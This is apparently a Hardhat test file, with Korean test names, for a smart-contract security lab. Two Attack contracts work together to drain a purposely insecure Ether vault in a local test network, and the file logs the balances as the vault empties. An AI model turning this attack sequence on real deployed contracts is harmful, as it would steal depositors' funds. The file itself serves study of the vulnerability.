import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { Signer, ContractTransactionResponse, EtherscanPlugin } from 'ethers';
import { ethers } from 'hardhat';
import {
  InsecureEtherVault,
  FixedEtherVault,
  Attack,
} from '../typechain-types';
import { expect } from 'chai';

describe('Attack1', () => {
  const deployInsecureEtherVault = async () => {
    const InsecureEtherVaultFactory =
      await ethers.getContractFactory('InsecureEtherVault');
    const InsecureEtherVault = await InsecureEtherVaultFactory.deploy();
    const FixedEtherVaultFactory =
      await ethers.getContractFactory('FixedEtherVault');
    const FixedEtherVault = await FixedEtherVaultFactory.deploy();
    const AttackFactory1 = await ethers.getContractFactory('Attack');
    const AttackFactory2 = await ethers.getContractFactory('Attack');
    const Attack1 = await AttackFactory1.deploy(InsecureEtherVault);
    const Attack2 = await AttackFactory2.deploy(InsecureEtherVault);
    const Signers = await ethers.getSigners();

    return { Signers, InsecureEtherVault, FixedEtherVault, Attack1, Attack2 };
  };
  let insecureEtherVault: InsecureEtherVault & {
    deploymentTransaction(): ContractTransactionResponse;
  };

  let fixedEtherVault: FixedEtherVault & {
    deploymentTransaction(): ContractTransactionResponse;
  };
  let attack1: Attack & {
    deploymentTransaction(): ContractTransactionResponse;
  };
  let attack2: Attack & {
    deploymentTransaction(): ContractTransactionResponse;
  };
  let signers: Signer[];

  before(async () => {
    console.log('before');
    const { Signers, InsecureEtherVault, FixedEtherVault, Attack1, Attack2 } =
      await loadFixture(deployInsecureEtherVault);
    signers = Signers;
    insecureEtherVault = InsecureEtherVault;
    fixedEtherVault = FixedEtherVault;
    attack1 = Attack1;
    attack2 = Attack2;
  });

  describe('공격 준비', () => {
    let first_user;
    let second_user;
    it('first user와 second user가 20 ETH씩 공급한다.', async () => {
      first_user = signers[1];
      second_user = signers[2];
      const depositAmount = ethers.parseEther('20.0');
      // 첫번째 유저 20 ETH 입금
      await insecureEtherVault
        .connect(first_user)
        .deposit({ value: depositAmount });
      // 확인
      expect(await insecureEtherVault.getUserBalance(first_user)).to.be.equal(
        depositAmount,
      );
      // 두번째 유저 20 ETH 입금
      await insecureEtherVault
        .connect(second_user)
        .deposit({ value: depositAmount });

      // 확인
      expect(await insecureEtherVault.getUserBalance(second_user)).to.be.equal(
        depositAmount,
      );
      // insecureEtherVault 컨트랙트에 들어 있는 총 잔액 확인
      expect(await insecureEtherVault.getBalance()).to.be.equal(
        depositAmount * 2n,
      );
    });
    it('Attack[1] 컨트랙트에 Attack[2] 컨트랙트를 Peer로 설정할 수 있다', async () => {
      await attack1.setAttackPeer(attack2);
      expect(await attack1.attackPeer()).to.be.equal(
        await attack2.getAddress(),
      );
    });
  });
  describe('공격', () => {
    let attacker: Signer;
    it('공격자는 Attack[1] 컨트랙트에 ETH를 공급하지 않으면 공격할 수 없다. (value < 1)', async () => {
      attacker = signers[1];
      await expect(attack1.connect(attacker).attackInit()).to.be.revertedWith(
        'Require 1 Ether to attack',
      );
    });

    it('공격자는 2 ETH 이상 공급하면 공격할 수 없다. (value >= 2)', async () => {
      attacker = signers[1];
      await expect(
        attack1
          .connect(attacker)
          .attackInit({ value: ethers.parseEther('2.0') }),
      ).to.be.revertedWith('Require 1 Ether to attack');
    });

    it('공격자는 1 ETH를 통해 공격할 수 있다. (value == 1)', async () => {
      ///////////////////
      console.log('Attack 컨트랙트');
      console.log(
        'InsecureEtherVault           => ',
        await insecureEtherVault.getAddress(),
      );
      console.log('Attack에 등록된 주소      => ', await attack1.etherVault());
      console.log('------------');
      console.log('Attack[2]             => ', await attack2.getAddress());
      console.log('Attack에 등록된 주소   => ', await attack1.attackPeer());

      console.log('---------------------');

      for (let i = 0; i < 7; i++) {
        // it((await insecureEtherVault.getBalance() === ethers.parseEther('0')){
        //   break;
        // }
        let tx = await attack1.attackInit({ value: ethers.parseEther('1.0') });
        await attack2.attackNext();

        console.log(`Iteration ${i + 1}`);
        console.log(
          'Attack[1]',
          ethers.formatEther(await attack1.getBalance()),
        );
        console.log(
          'Attack[2]',
          ethers.formatEther(await attack2.getBalance()),
        );
        console.log(
          'InsecureEtherVault',
          ethers.formatEther(await insecureEtherVault.getBalance()),
        );
        console.log('-----');
      }
    });
    it('공격자는 Attack[2] 컨트랙트를 통해 출금을 요청한다.', async () => {
      // console.log(await attack2.getBalance());
      // await attack2.attackNext();
      // console.log(await attack2.getBalance());
      // console.log(await attack1.getBalance());
    });
  });
});
